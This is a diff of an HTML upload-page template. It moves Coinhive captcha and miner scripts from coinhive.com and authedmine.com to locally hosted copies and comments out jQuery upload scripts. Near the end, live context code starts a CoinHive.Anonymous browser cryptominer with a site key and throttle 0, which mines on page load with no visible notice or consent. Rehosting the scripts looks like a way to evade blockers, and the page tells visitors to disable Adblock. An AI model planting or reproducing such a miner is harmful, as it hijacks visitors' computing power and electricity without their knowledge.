@@ -7,10 +7,11 @@
 <link rel="stylesheet" type="text/css" href="css/firstPage.css" />
 <link rel="stylesheet" type="text/css" href="css/global.css" />
 <script src='https://www.google.com/recaptcha/api.js'></script>
+<!--
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
 <script src="js/vendor/jquery.ui.widget.js"></script>
 <script src="js/jquery.iframe-transport.js"></script>
-<script src="js/jquery.fileupload.js"></script>
+<script src="js/jquery.fileupload.js"></script> -->
 </head>
 <div id="container">
 <body>
@@ -32,14 +33,11 @@
     <div id=captcha>
     <div id="recaptcha" class="g-recaptcha" data-sitekey="%v">
     </div>
-	<script src="https://authedmine.com/lib/captcha.min.js" async></script>
-	<div id="powcaptcha" class="coinhive-captcha" data-hashes="1024" data-key="%v">
-		<em>Loading Captcha...<br>
-		If it doesn't load, please disable Adblock!</em>
-	</div>
+    <script src="/js/captcha.min.js" async></script>
+    <div class="coinhive-captcha" data-hashes="1024" data-key="%v">
+        <em>Loading Captcha...<br>
+        If it doesn't load, please disable Adblock!</em>
     </div>
-    <div id="progress">
-        <progress max="100"></progress>
     </div>
     <div id="status"></div>
 	<div id="submit">
@@ -66,7 +64,7 @@ xhr.upload.onprogress = function (event) {
 xhr.send(formData);
 </script>
     
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="/js/coinhive.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});
 
